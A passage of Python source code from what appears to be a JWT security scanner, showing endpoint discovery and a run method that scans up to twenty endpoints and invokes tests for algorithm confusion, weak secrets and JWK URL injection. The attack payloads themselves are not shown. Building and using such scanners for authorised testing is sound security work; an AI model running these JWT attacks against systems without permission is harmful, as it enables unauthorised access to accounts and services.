                    endpoints.append(url)

            # Add form actions
            for form in results.get("forms", []):
                endpoints.append(form.get("action", ""))

        except Exception as e:
            self.log("WARNING", f"[JWT] Error discovering endpoints: {str(e)}")

        # Always include the main target
        if self.target not in endpoints:
            endpoints.insert(0, self.target)

        return endpoints

    def run(self):
        self.log("INFO", f"[JWT] Starting JWT security scanning on {self.target}...")

        try:
            # Step 1: Discover endpoints
            self.log("INFO", "[JWT] Discovering endpoints that might use JWT...")
            endpoints = self._discover_jwt_endpoints()
            self.log("INFO", f"[JWT] Found {len(endpoints)} endpoint(s) to scan")

            # Step 2: Scan each endpoint
            for url in endpoints[:20]:  # Limit to 20 endpoints
                self._scan_endpoint(url)

            # Step 3: Run standalone JWT attack tests (kid injection, algorithm confusion, JWK injection)
            self._test_algorithm_confusion_standalone()
            self._test_weak_secret_standalone()
            self._test_jwk_url_injection()

        except Exception as e:
            self.log("WARNING", f"[JWT] Unexpected error during scan: {str(e)}")

        # Summary
        self.log("SUCCESS" if not self.vulns else "WARNING",
                 f"[JWT] Complete — {self._tokens_found} token(s) analyzed | "
                 f"{self._vulns_found} vulnerability/vulnerabilities found")
        return self.vulns
